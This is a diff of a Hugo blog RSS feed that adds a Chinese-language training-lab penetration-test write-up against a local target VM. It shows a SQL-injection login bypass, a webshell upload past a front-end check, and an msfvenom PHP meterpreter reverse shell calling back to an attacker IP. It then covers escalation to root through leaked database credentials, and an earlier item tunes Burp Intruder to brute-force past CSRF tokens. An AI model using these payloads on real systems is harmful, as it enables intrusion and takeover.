@@ -7,7 +7,272 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Fri, 06 Feb 2026 13:52:21 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 06 Feb 2026 15:45:23 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>2.6-3 综合简单 渗透测试报告</title>
+        <link>https://www.retr0.xyz/p/2.6-3-%E7%BB%BC%E5%90%88%E7%AE%80%E5%8D%95-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</link>
+        <pubDate>Fri, 06 Feb 2026 15:45:23 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/2.6-3-%E7%BB%BC%E5%90%88%E7%AE%80%E5%8D%95-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</guid>
+        <description>&lt;blockquote&gt;
+&lt;p&gt;靶机登陆后先执行&lt;code&gt;passwd root&lt;/code&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;，修改密码为&lt;/font&gt;&lt;code&gt;asd123***&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
+&lt;/h2&gt;&lt;p&gt;&lt;code&gt;arp-scan -l&lt;/code&gt;扫一下目标IP&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/001.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;确认了目标IP为&lt;code&gt;192.168.80.162&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;nmap详细扫描&lt;code&gt;nmap -A 192.168.80.162&lt;/code&gt;&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/002.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看到打开了 &lt;strong&gt;21(ftp)、22(ssh)、80(http)&lt;/strong&gt; 三个端口。&lt;/p&gt;
+&lt;p&gt;先访问web页面吧&lt;code&gt;http://192.168.80.162/&lt;/code&gt;&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/003.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;何意味？&lt;/p&gt;
+&lt;p&gt;御剑扫一下&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/004.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看看&lt;code&gt;login.php&lt;/code&gt;，&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/005.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;随便输入账密提交抓不到包而是直接弹窗，关闭 js 后不弹窗了，说明存在前端检查。&lt;/p&gt;
+&lt;p&gt;查看源代码发现如下的 js 代码：&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/006.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可见前端首先对用户名进行了一次判断，用户名必须为：&lt;code&gt;xxx@btrisk.com&lt;/code&gt;的形式表单才会被提交处理&lt;/p&gt;
+&lt;p&gt;所以我们输入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;用户名：admin@btrisk.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;密码：123&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; or &lt;span class=&#34;nv&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;文件上传&#34;&gt;文件上传
+&lt;/h2&gt;&lt;p&gt;成功登入，发现存在文件上传：&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/007.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;右键查看源代码，同样存在前端的 js 文件基础验证：&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/008.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;常规玩法webshell&#34;&gt;常规玩法（webshell）
+&lt;/h3&gt;&lt;p&gt;写一个一句话木马，后缀名为jpg来绕过前端验证，burp抓包修改数据包里的后缀名为php&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/009.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看&lt;code&gt;http://192.168.80.162/uploads/&lt;/code&gt;已经成功上传并且可以成功执行语句&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/010.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;进阶玩法msf木马&#34;&gt;进阶玩法（msf木马）
+&lt;/h3&gt;&lt;p&gt;使用msf生成免杀的php木马：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p php/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.80.157 &lt;span class=&#34;nv&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f raw &amp;gt; hello.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;木马大概长这样：&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/011.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;提前在msf中开启回弹等待&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/multi/handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost 192.168.80.157
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload php/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将刚才的木马上传（方法同上），到&lt;code&gt;http://192.168.80.162/uploads/&lt;/code&gt;中访问该木马。&lt;/p&gt;
+&lt;p&gt;成功拿到meterpreter&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/012.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;提权&#34;&gt;提权
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;发现了&lt;code&gt;config.php&lt;/code&gt;数据库配置文件&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/013.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;说明数据库账密为&lt;code&gt;root:toor&lt;/code&gt;，遂尝试sql连接数据库&lt;/p&gt;
+&lt;p&gt;先升级美化一下终端：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;sql连接成功数据库：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -uroot -ptoor
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/014.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;手动查表：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show databases&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use deneme&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show tables&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from user&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-3/015.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用查到的密码切换至root用户&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;su root
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;密码为：asd123***
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;不过这个靶场的root目录下没有flag&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>2.6-2 ctf-命令注入 渗透测试报告</title>
         <link>https://www.retr0.xyz/p/2.6-2-ctf-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</link>
         <pubDate>Fri, 06 Feb 2026 13:52:21 +0800</pubDate>
@@ -170,15 +435,24 @@
 	
 &gt;&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;burp抓包，发送到intruder模式为pitch fork，把密码，和token做标记&lt;/font&gt;&lt;/li&gt;
-&lt;li&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;到payload中，payload2使用密码字典，&lt;/font&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;options&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;中线程选择1，下面的&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;grep extract&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;（正则表达式），点&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;add&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;，&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;Extract from regex group &lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;填入&lt;/font&gt;&lt;code&gt;&amp;lt;input[^&amp;gt;]*name=&amp;quot;X-CSRF-Token&amp;quot;[^&amp;gt;]*value=&amp;quot;([^&amp;quot;]+)&amp;quot;&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;并勾选&lt;strong&gt;Case sensitive&lt;/strong&gt; ，&lt;strong&gt;OK&lt;/strong&gt;&lt;/p&gt;
-&lt;ol start=&#34;4&#34;&gt;
-&lt;li&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;下面的&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;redirections&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;，点&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;always&lt;/font&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;回到payload，选1，选择&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;Recurisive grep&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;，在下面的地方写上当前token的值&lt;/font&gt;&lt;/li&gt;
-&lt;li&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;记得把&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;payload encoding&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;的勾去掉，&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;Start Attack&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;.&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;burp抓包，发送到intruder模式为pitch fork，把密码，和token做标记&lt;/font&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;到payload中，payload2使用密码字典，&lt;/font&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;options&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;中线程选择1，下面的&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;grep extract&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;（正则表达式），点&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;add&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;，&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;Extract from regex group &lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;填入&lt;/font&gt;&lt;code&gt;&amp;lt;input[^&amp;gt;]*name=&amp;quot;X-CSRF-Token&amp;quot;[^&amp;gt;]*value=&amp;quot;([^&amp;quot;]+)&amp;quot;&lt;/code&gt;并勾选&lt;strong&gt;Case sensitive&lt;/strong&gt; ，&lt;strong&gt;OK&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;下面的&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;redirections&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;，点&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;always&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;回到payload，选1，选择&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;Recurisive grep&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;，在下面的地方写上当前token的值&lt;/font&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;记得把&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;payload encoding&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;的勾去掉，&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;Start Attack&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;.&lt;/font&gt;&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
 &lt;hr&gt;
 &lt;p&gt;发现密码是&lt;code&gt;diana&lt;/code&gt;，输入后成功进入后台：&lt;/p&gt;
